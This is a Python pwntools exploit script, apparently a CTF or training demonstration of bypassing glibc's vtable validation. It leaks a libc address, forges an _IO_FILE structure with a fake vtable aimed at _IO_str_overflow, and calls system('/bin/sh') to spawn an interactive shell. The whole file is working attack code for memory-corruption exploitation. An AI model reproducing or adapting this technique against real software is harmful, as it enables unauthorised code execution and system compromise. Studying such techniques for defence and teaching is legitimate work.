# Name: bypass_valid_vtable.py
from pwn import *
p = process("./bypass_valid_vtable", env={"LD_PRELOAD":"./libc.so.6"})
libc = ELF('./libc.so.6')
elf = ELF('./bypass_valid_vtable')
print p.recvuntil("stdout: ")
leak = int(p.recvuntil("\n").strip("\n"),16)
libc_base = leak - libc.symbols['_IO_2_1_stdout_']
io_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
# io_str_overflow = libc.symbols['_IO_str_overflow']
io_str_overflow = io_file_jumps + 0xd8
fake_vtable = io_str_overflow - 16
binsh = libc_base + next(libc.search("/bin/sh"))
system = libc_base + libc.symbols['system']
fp = elf.symbols['fp']
payload = p64(0x0) # flags
payload += p64(0x0) # _IO_read_ptr
payload += p64(0x0) # _IO_read_end
payload += p64(0x0) # _IO_read_base
payload += p64(0x0) # _IO_write_base
payload += p64(( (binsh - 100) / 2 )) # _IO_write_ptr
payload += p64(0x0) # _IO_write_end
payload += p64(0x0) # _IO_buf_base
payload += p64(( (binsh - 100) / 2 )) # _IO_buf_end 
payload += p64(0x0) # _IO_save_base
payload += p64(0x0) # _IO_backup_base
payload += p64(0x0) # _IO_save_end
payload += p64(0x0) # _IO_marker
payload += p64(0x0) # _IO_chain
payload += p64(0x0) # _fileno
payload += p64(0x0) # _old_offset
payload += p64(0x0)
payload += p64(fp + 0x80) # _lock 
payload += p64(0x0)*9
payload += p64(fake_vtable) # io_file_jump overwrite 
payload += p64(system) # fp->_s._allocate_buffer RIP
p.sendline(payload)
p.interactive()